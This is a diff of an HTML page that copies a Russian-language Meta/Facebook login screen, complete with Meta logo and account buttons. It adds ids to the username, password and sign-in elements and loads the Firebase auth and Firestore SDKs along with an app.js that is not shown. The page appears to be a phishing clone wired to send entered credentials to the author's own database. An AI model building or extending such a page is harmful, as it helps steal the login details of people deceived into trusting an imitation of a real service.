@@ -9,14 +9,22 @@
 <body>
     <p class="head_title">Русский</p>
     <img class="logo" src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" alt="logo">
-    <input class="input_margin" type="text" placeholder="Имя пользователя, эл. адрес или мобильный телефон">
-    <input type="password" placeholder="Пароль">
-    <button>Войти</button>
-    <p class="reset_password">Забыли пароль?</p>  
+    <input class="input_margin" type="text" id="username" placeholder="Имя пользователя, эл. адрес или мобильный телефон">
+    <input type="password" id="password" placeholder="Пароль">
+    <button id="signInBtn">Войти</button>
+    <p class="reset_password">Забыли пароль?</p>
 
     <aside>
         <button class="footer_button">Создать новый аккаунт</button>
         <img class="footer_img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" alt="logo">
     </aside>
+
+    <!-- Подключение Firebase SDK как модули -->
+    <script type="module" src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+
+    <!-- Ваш JavaScript файл (app.js) -->
+    <script type="module" src="app.js"></script>
 </body>
 </html>
